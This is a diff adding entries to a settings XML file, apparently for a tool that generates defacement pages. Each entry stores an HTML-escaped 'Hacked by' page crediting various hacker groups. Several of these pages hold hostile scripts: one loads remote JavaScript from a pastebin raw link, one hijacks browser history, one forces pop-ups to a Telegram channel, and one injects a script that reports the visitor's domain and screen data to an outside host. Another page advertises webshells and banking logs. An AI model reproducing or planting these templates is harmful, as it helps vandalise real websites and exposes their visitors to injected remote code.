+&lt;br&gt; 		&lt;font face="Patrick Hand" size="7px" color="black" style="text-shadow: 0 0 3px red, 0 0 5px red;"&gt;ごめんなさい遊びたいだけです &lt;/font&gt;&lt;br&gt; &lt;/font&gt; &lt;font face="Bubblegum Sans" size="7px" color="red"&gt;&lt;b&gt;&lt;font color=black&gt;[&lt;/font&gt;OTAKU DEFACER A.K.A&lt;font color=black&gt;]&lt;/font&gt;&lt;/b&gt;&lt;/font&gt; </Value>
+    </Setting>
+    <Setting Name="Setting13" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="gb2312"&gt; 
+  &lt;title&gt;???????&lt;/title&gt;
+
+&lt;meta name="title" content="You System Have Been Down!"&gt; 
+  &lt;meta name="keywords" content="Hacked by Ang3"&gt; 
+  &lt;meta name="description" content="Ang3 Was Here!! Knocking At Your Web Security"&gt; 
+  &lt;meta name="author" content="Newbiez Cyber Alliance"&gt; 
+  &lt;meta name="viewport" content="width=device-width, initial-scale=0.53"&gt; 
+  &lt;meta property="og:description" content="Hello???Admin!!!"&gt; 
+  &lt;meta property="og:title" content="Ang3 Was Here Knocking At Your Security"&gt;
+  &lt;meta property="og:image" content="https://b.top4top.io/p_26557v2lb1.png"&gt;
+  &lt;link rel="icon" href="https://b.top4top.io/p_26557v2lb1.png"&gt;
+
+&lt;body&gt;&lt;br&gt;&lt;p class="bru"&gt;Expect &lt;span class="lol1"&gt;Us&lt;/span&gt;!&lt;/p&gt;
+&lt;span style="color: rgb(0, 255, 115); font-weight: bold; color:#00ff80;background: url(https://cdn.discordapp.com/attachments/935214600750780506/939021374071136297/star_red.gif)"&gt; &lt;h2&gt;Hello Admin!! Just want to say that We found Vulnerable in your website
+You Need To Patch It, Don't wait for the other hackers Destroy Your Website&lt;/h2&gt;&lt;/span&gt;
+&lt;span style="color: rgb(225, 223, 0); font-weight: bold; color:##FFD700;background: url(https://cdn.discordapp.com/attachments/935214600750780506/939021374071136297/star_red.gif)"&gt; &lt;h3&gt;Don't Worry Your Files is Safe and No Data Will be Leaked... Good Byeeee!! Ooopz Btw Patch it now don't wait for us to comeback!!!&lt;/h3&gt;
+    &lt;img class="okdude" src="https://b.top4top.io/p_26557v2lb1.png" alt="Newbiez Cyber Alliance."&gt;&lt;/p&gt;
+
+    
+
+
+
+&lt;marquee behavior="scroll" scrollamount="10" width="80%"&gt;
+
+&lt;font color="00ff80" size="40px" face="monospace"&gt;
+&lt;style&gt; img{ animation-name: rotate ; animation-duration: 6s; animation-play-state: running; animation-timing-function: linear; animation-iteration-count: infinite; } @keyframes rotate{ 10% {transform:rotateY(36deg)} 20% {transform:rotateY(72deg)} 30% {transform:rotateY(108deg)} 40% {transform:rotateY(144deg)} 50% {transform:rotateY(180deg)} 60% {transform:rotateY(216deg)} 70% {transform:rotateY(252deg)} 80% {transform:rotateY(288deg)} 90% {transform:rotateY(324deg)} 100% {transform:rotateY(360deg)} } 
+    &lt;/style&gt;
+        Greetz:// ------ AHG@MR.SULINUX | Ph.Ang3 | SH1M1ZU | k4sh1 | Ph_annunaki | MR.H4XOR | M1TZ | PH.Hudas| Diablox | Ana Lee | Regex | HENTAI | Mr.Pr4xor | MR.P4RK | M1TZ | MR.D4RK | Xy.Mastah | PH.Zhien | Ph. Care x Ph.Cyber Olok | PH.DemonX | PH.Sk1d | BETMEN | Kape Tau | AHG@MS.VIEN.3X3 | AHG@VALIE.3H1 | AHG@GREECE | AHG@MAQEDONIA | AHG@CYBERHOOK | AHG@TIRMONIA29 | AHG@FENZAKI | AHG@RIZUE.PX | AHG@SIBERIANFUCK | AHG@TORBOY"HE" | AHG@LIBIOD# | AHG@MANDENGAKI? | AHG@KRAK3RAB4H | AHG@PYMIRVLAD;INTAX:="7" |------
+ 
+&lt;/font&gt;
+
+&lt;/marquee&gt;
+
+    &lt;style&gt;
+        * {
+        text-align: center;
+        }
+        body {
+        background-color: white;
+        letter-spacing: 2.99px;
+        background-image: url('https://i.pinimg.com/originals/e6/9f/39/e69f39fef446fa781dd10d9a4e6eefc9.gif');
+
+margin:auto;
+height:100%;
+top:0;
+bottom:0;
+left:0;
+right:0
+        }
+        img {
+        width: 30%;
+        color: transparent;
+        pointer-events: none;
+    cursor: default;
+        }
+        .bit,.phan {
+        color: red;
+        width: 100%;
+        }
+        p {
+        color: white;
+        }
+        .di {
+        color: red;
+        }
+       
+        
+        .lol {
+            color: blue;
+        }
+        .bru {
+            color: gold;
+        }
+        .lol1 {
+            color: gold;
+        }
+        .okdude {
+            width: 30%;
+            pointer-events: none;
+    cursor: default;
+        }
+           marquee {
+        border: 4px solid gold;
+        border-radius: 10px;
+        border-bottom-color: gold;
+        }
+
+    &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;br&gt;&lt;br&gt;&lt;font wght='900' color='gold' size="6"&gt;Ang3 Was Here &lt;br&gt; Newbiez Cyber Alliance&lt;/font&gt;
+        &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;font color='white' size="3"&gt;TEAM Greetz:&lt;/font&gt;
+        &lt;br&gt;&lt;font color='#00ff80' size="3"&gt;----- Radiant Cyber Army | Albanian Hackers Group | Anonymous Philippines | DeathNote Hackers PH | H4xxor Cyber Army | Systematic Cyber Squad | SkidSec Philippines | Cyberburst Philippines | C0D3X Cyber Army | Cyber Phoenix Philippines | -----  &lt;/font&gt;
+        
+        &lt;br&gt;&lt;br&gt;&lt;a href="https://www.facebook.com/NewbiezCyberAlliance?mibextid=ZbWKwL" target="_blank" style="color: Yellow; font-family: Creepster;"&gt;NEVER SLEEPIN' , ALWAYS CREEPIN'&lt;/a&gt;&lt;/font&gt;
+        &lt;audio loop autoplay controls hidden&gt;&lt;source src="https://a.top4top.io/m_24721zebd0.mp3" type="audio/mp3"&gt;&lt;/audio&gt;
+        &lt;iframe width="0" height="0" src="https://j.top4top.io/m_2624d6p6i1.mp3" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;
+        &lt;br&gt;&lt;br&gt;&lt;br&gt;
+        &lt;p&gt;&lt;font color='white'&gt;Copyright &lt;script type="text/javascript"&gt;document.write(new Date().getFullYear());&lt;/script&gt; | &lt;span id="groupName"&gt;Newbiez Cyber Alliance&lt;/span&gt; | All Right Reserved&lt;/font&gt;&lt;/p&gt;
+        &lt;/td&gt;
+        &lt;/table&gt;
+&lt;/body&gt;</Value>
+    </Setting>
+    <Setting Name="Setting14" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;html&gt;
+    &lt;head&gt;
+    &lt;link rel="icon" type="image/png" href="https://i.hizliresim.com/3d21cl0.jpg" type="image/x-icon" /&gt;    
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;title&gt; Owned By SHENZYY&lt;/title&gt;
+&lt;body style="background-color: #000000;"&gt;
+&lt;div align="center"&gt;
+&lt;br&gt;&lt;br&gt;&lt;img src="https://media.giphy.com/media/RTrsyzuasWjVS/giphy.gif"&gt;&lt;br&gt;&lt;br&gt;
+&lt;font color="black" size="17"&gt;
+    &lt;font color="white" face="Share Tech Mono" size="3" color="gray" &gt;&lt;font size="6"&gt;
+Owned By &lt;font color="red"&gt;SHENZYY&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;
+&lt;font color="white" face="Share Tech Mono" size="3" color="gray"&gt;&lt;font size="3" color="gray"&gt;
+&lt;h6&gt;TURKISH ARMY IS COMING&lt;br&gt;&lt;br&gt;TEK DOST SHENZYY &amp; ANONYKS_xd &amp; BARLAS &amp; KES&lt;/font&gt;&lt;/h6&gt;
+&lt;style&gt;h6{color:white;}&lt;/style&gt;&lt;br&gt;
+&lt;font color="white" face="Share Tech Mono" size="3"&gt;
+&lt;h3&gt;',there is an open in the system, we did not harm it, please contact us ,'&lt;/h3&gt;
+&lt;br&gt;
+    &lt;audio id="audio" preload="" autoplay="" loop=""&gt;
+        &lt;source src="https://cdn.discordapp.com/attachments/8046.71693850148864/1070735791703199806/Lust-Aslinda-19.mp3" type="audio/mpeg"&gt;
+    &lt;/audio&gt;
+&lt;a href="https://twitter.com/sibersube" target="_blank"&gt;&lt;img src="https://i.hizliresim.com/kw2h0kp.png" width="50" height="50" title="Twitter"/&gt;&lt;/a&gt;
+&lt;a href="https://www.instagram.com/shenzyy001/" target="_blank"&gt;&lt;img src="https://i.hizliresim.com/a2f0fwh.png" width="50" height="50" title="Instagram"/&gt;&lt;/a&gt;
+&lt;a href="https://t.me/anonyksxd" target="_blank"&gt;&lt;img src="https://i.hizliresim.com/u3cwwzb.png" width="50" height="50" title="Telegram"/&gt;&lt;/i&gt;&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Setting15" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;html&gt;
+&lt;!DOCTYPE R html PUBLIC z "-//W3C//DTD XHTML 0 Transitional//EN" 4 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;link href="https://fonts.googleapis.com/css?family=Passion+One" rel="stylesheet"&gt; 
+&lt;style&gt;
+#sole {
+font-family: 'Passion One', cursive;
+font-size:60px;
+}
+&lt;/style&gt;
+&lt;head&gt;&lt;body style="-moz-user-select: fals; cursor:; onkeydown=" return="" true;'="" oncontextmenu="return true;" onkeydown="return true;" onmousedown="return true;" bgcolor="black"&gt;&lt;center&gt;
+&lt;meta http-equiv="Content-Language" content="fa" /&gt;
+&lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;
+&lt;title&gt;Hacked By EbRaHiM-VaKeR&lt;/title&gt;
+&lt;img src="https://s29.picofile.com/file/8461683534/EbRaHiM_BlackHat.jpg" width="508" height="400"&gt;&lt;/p&gt;
+&lt;font size="6" face="Gabriola"&gt;&lt;div id="sole"&gt;&lt;font color="lime"&gt;Hacked By EbRaHiM-VaKeR&lt;br&gt;&lt;/div&gt;
+&lt;/BODY&gt;
+&lt;font size="5" face="Gabriola"&gt;&lt;font color="red"&gt;&lt;br&gt;
+🛒 Hacking Tools
+🛒 Banking Logs
+🛒 Webshells&lt;br&gt;
+&lt;font size="5" face="Gabriola"&gt;&lt;font color="red"&gt;&lt;br&gt;&lt;br&gt;
+&lt;center&gt;Thanks: AHORA - Special_One - H4 Expl0it3r&lt;font color="white" size="8"&gt;
+&lt;font face="Gabriola" size="6"&gt;&lt;font color="red"&gt;&lt;b&gt;  &lt;font color="white"&gt;  &lt;font color="green"&gt;  
+&lt;br&gt;
+
+&lt;font size="4" face="Gabriola"&gt;&lt;font color="red"&gt;&lt;br&gt;&lt;a href="http://zone-hc.org"
+ class="style5" style="text-decoration: none;"&gt;&lt;font face="Gabriola" size="5"&gt;&lt;font color="red"&gt;&lt;b&gt;| 2023 &lt;font face="Gabriola" size="4"&gt;&lt;font color="white"&gt; Zone-HC.Org | Add Your Deface&lt;/span&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/span&gt;&lt;span
+&lt;/script&gt;&lt;br&gt;&lt;br&gt;
+&lt;script&gt;window.onclick=function(){window.open('https://t.me/LegionLeaker')}&lt;/script&gt;
+&lt;iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="https://music.163.com/outchain/player?type=2&amp;id=1337608187&amp;auto=1&amp;height=66"&gt;&lt;/iframe&gt;
+&lt;script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"&gt;&lt;/script&gt;
+&lt;script data-cfasync="false" src="https://tses.io/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"&gt;&lt;/script&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Setting16" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;html&gt; 
+
+&lt;head&gt; &lt;link rel="icon" type="image/png" href="https://i.pinimg.com/originals/f4/35/22/f43522bf3b4bbe2ed9927c250467bd3b.jpg" type="image/x-icon"/&gt; 
+&lt;title&gt;Hacked By Mr.cyb3rgh0st&lt;/title&gt; 
+&lt;meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"&gt; 
+&lt;meta name="google-site-verification" content="VxSee7"/&gt; 
+&lt;meta name="theme-color" content="black"&gt; 
+&lt;meta http-equiv="Content-Type" content="text/html; charset=Windows-1254"/&gt; 
+&lt;meta name="description" content="Needs To Be Respected"&gt; 
+&lt;meta name="author" content="Main IT"/&gt; 
+&lt;meta name="keywords" content="Main IT"/&gt; 
+&lt;meta name="googlebot" content="all"/&gt; 
+&lt;meta name="robots" content="all" /&gt; &lt;meta name="googlebot-news" content="all" /&gt; &lt;meta name="google" content="notranslate"/&gt; &lt;meta name="og:title" content="Hacked By Mr.cyb3rgh0st"/&gt; &lt;meta property="og:image" content="https://static.zerochan.net/Aoi.Ogata.full.2293650.jpg" /&gt; &lt;meta property="og:type" content="website" /&gt; &lt;meta property="og:updated_time" content="1440432930" /&gt; &lt;/span&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"&gt;&lt;/script&gt; &lt;/head&gt; 
+&lt;style type="text/css"&gt; /* Copyright Mr. Cyb3rgh0st */ @import url("https://fonts.googleapis.com/css?family=Iceland|Shadows+Into+Light&amp;display=swap"); body{ overflow:hidden; display: flex; align-items: center; justify-content: center; margin:0; padding:0; width:100%; background-color:black; } i{ margin:10px; color: red; } a:link{ color:#000; } h1{ color: #000; text-decoration: none; border-radius:0px; border:0px; font-family: 'Shadows Into Light', cursive; font-size:50px; margin:0px; padding:0px; animation:psychoxploit 0.5s linear infinite; } pre{ color:grey; } marquee{ width:100%; } @keyframes psychoxploit{ 2%{color:#fff;} 3%{transform:translate(2px,-10px) skewX(3240deg);} 5%{transform:translate(0px,0px) skewX(0deg);} 2% , 54%{transform:translateX(0px) skew(0deg);} 55%{transform:translate(-2px,6px) skew(-5530deg);} 56%{transform:translate(0px,0px) skew(0deg);} 57%{transform:translate(4px,-10px) skew(-70deg);} 58%{transform:translate(0px,0px) skew(0deg);} 62%{transform:translate(0px,20px) skew(0deg);} 63%{transform:translate(4px,-2px) skew(0deg);} 90%{transform:translate(1px,3px); skew(-230deg);} 95%{transform:translate(-7px,2px); skew(-120deg);} 100%{transform:translate(0px,0px) skew(0deg);} &lt;/style&gt; 
+&lt;body scroll="no" style="overflow: hidden" ondragstart="window.event.returnValue=false" onselectstart="event.returnValue=false"&gt; &lt;embed src="https://pomf2.lain.la/f/56wvlqsi.mp3" type="audio/mpeg" autostart="true" loop="true" height="0" width="0"&gt; &lt;script&gt; (function () { for(var i = 0; i &lt; 20; i++) { history.pushState(null, document.title, window.location.href ); } })(document, window, history); &lt;/script&gt; &lt;center&gt; &lt;img title="Hacked by Mr.cyb3rgh0st" class="picture" src="https://static.zerochan.net/Aoi.Ogata.full.2293650.jpg" width="300px" height="500px"/&gt; &lt;br&gt;
+&lt;h1&gt;&lt;font color="red"&gt;Hacked by&lt;/font&gt; Mr.cyb3rgh0st&lt;/h1&gt;&lt;br&gt; 
+&lt;p&gt; &lt;a href="https://t.me/mrcyb3rgh0st" target="_blank"&gt;&lt;font color="red" size="+3"&gt;Private message&lt;/font&gt; &lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; &lt;a href=" " target="_blank"&gt;&lt;font color="red"&gt;s0rry 4dmin y0u syst3m 1s n0t s3cur3&lt;/font&gt; &lt;/a&gt;&lt;/p&gt;
+
+&lt;br&gt; &lt;p&gt;&lt;marquee direction="scroll"&gt;&lt;pre&gt;&lt;font color="green" size="50"&gt;I am gr4y h4t h4ck3r&lt;/pre&gt;&lt;/marquee&gt; &lt;/p&gt;&lt;br&gt;  
+ &lt;/center&gt; &lt;script type="text/javascript"&gt;if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "" + "&amp;idc_r="+idc_glo_r + "&amp;domain="+document.domain + "&amp;sw="+screen.width+"&amp;sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};&lt;/script&gt;
+&lt;/body&gt; 
+
+
+ &lt;/html&gt;
+</Value>
+    </Setting>
+    <Setting Name="Setting17" Type="System.String" Scope="User">
+      <Value Profile="(Default)">&lt;title&gt;hacked by s3cbugs_r00t | s3cbugs.com&lt;/title&gt;
+    &lt;meta name="robots" content="all"/&gt;&lt;meta name="robots schedule" content="auto"/&gt;
+    &lt;meta contact="#"&gt; &lt;meta charset="utf-8"&gt;
+    &lt;style&gt;
+    html, body {
+        color: #000000;
+        font-family: 'Fredericka the Great', sans-serif;
+        font-weight: 100;
+        height: 100vh;
+        margin: 0;
+    }
+    .full-height {
+        height: 100vh; 
+    } 
+    
+    .flex-center {
+        align-items: center;
+        display: flex;
+        justify-content: center;
+    }
+    .position-ref { 
+        position: relative; 
+    }
+    .content {
+        text-align: center;
+    }
+    .title {
+        font-size: 36px;
+        padding: 20px;
+    }
+    &lt;/style&gt;
+    &lt;style&gt;&lt;/style&gt;&lt;/head&gt;
+    &lt;body align="center" oncontextmenu="return false" bgcolor="#100F0D"&gt;
+    &lt;div class="stars"&gt;
+    &lt;div class="twinkling"&gt;
+    &lt;div class="flex-center position-ref full-height"&gt;
+    &lt;div class="content"&gt;                                                                                                                  
+    &lt;div class="text"&gt;
+    &lt;font color="#F5D276"&gt;
+        &lt;img src="https://i.ibb.co/0c88zvm/logo.png" height="200" style="object-fit: scale-down; max-width: 100%; border-radius: 0%;" onclick="location.href = 'http://zone-h.org/archive/notifier=s3cbugs.com';"&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;b&gt;&lt;i&gt;
+        &lt;font size="6" style="text-decoration:none" onclick="location.href = 'http://zone-h.org/archive/notifier=s3cbugs.com';"&gt;&lt;code&gt;hacked by s3cbugs_r00t | s3cbugs.com&lt;/code&gt;&lt;/font&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+&lt;font color="#C41B16"&gt;
+        &lt;code style="text-decoration:none" onclick="location.href = 'https://twitter.com/s3cbugsteam';"&gt;twitter.com/s3cbugsteam&lt;/code&gt;
+        </Value>
+    </Setting>
+    <Setting Name="MONSTERMC" Type="System.String" Scope="User">
+      <Value Profile="(Default)">&lt;title&gt;hacked by s3cbugs_r00t | s3cbugs.com&lt;/title&gt;
+    &lt;meta name="robots" content="all"/&gt;&lt;meta name="robots schedule" content="auto"/&gt;
+    &lt;meta contact="#"&gt; &lt;meta charset="utf-8"&gt;
+    &lt;style&gt;
+    html, body {
+        color: #000000;
+        font-family: 'Fredericka the Great', sans-serif;
+        font-weight: 100;
+        height: 100vh;
+        margin: 0;
+    }
+    .full-height {
+        height: 100vh; 
+    } 
+    
+    .flex-center {
+        align-items: center;
+        display: flex;
+        justify-content: center;
+    }
+    .position-ref { 
+        position: relative; 
+    }
+    .content {
+        text-align: center;
+    }
+    .title {
+        font-size: 36px;
+        padding: 20px;
+    }
+    &lt;/style&gt;
+    &lt;style&gt;&lt;/style&gt;&lt;/head&gt;
+    &lt;body align="center" oncontextmenu="return false" bgcolor="#100F0D"&gt;
+    &lt;div class="stars"&gt;
+    &lt;div class="twinkling"&gt;
+    &lt;div class="flex-center position-ref full-height"&gt;
+    &lt;div class="content"&gt;                                                                                                                  
+    &lt;div class="text"&gt;
+    &lt;font color="#F5D276"&gt;
+        &lt;img src="https://cdn.discordapp.com/attachments/1102220881931010178/1102286968471158814/278475812_1453392461769324_7766334083205830929_n.jpg" height="200" style="object-fit: scale-down; max-width: 100%; border-radius: 0%;" onclick="location.href = 'https://t.me/MONSTERMCSY';"&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;b&gt;&lt;i&gt;
+        &lt;font size="6" style="text-decoration:none" onclick="location.href = 'https://t.me/MONSTERMCSY';"&gt;&lt;code&gt;MONSTERMC index generator | https://discord.gg/YMNUCersTM&lt;/code&gt;&lt;/font&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+&lt;font color="#C41B16"&gt;
+        &lt;code style="text-decoration:none" onclick="location.href = 'https://t.me/MONSTERMC';"&gt;Telegram:/@MONSTERMC&lt;/code&gt;
+		
+		    &lt;iframe src="https://k.top4top.io/m_2156ex9e51.mp3" allow="autoplay" style="display:none;" id="iframeAudio"&gt;&lt;/iframe&gt;
+    &lt;title&gt;Hacked By MONSTERMC&lt;/title&gt;
+   &lt;script&gt;
+           &lt;br&gt;
+        &lt;br&gt;
+ var source = "https://k.top4top.io/m_2156ex9e51.mp3"
+ var audio = document.createElement("audio");
+ //
+ audio.autoplay = true;
+ //
+ audio.load()
+ audio.addEventListener("load", function() { 
+     audio.play(); 
+ }, true);
+ audio.src = source;
+    &lt;/script&gt;
+  &lt;style&gt;
+        </Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
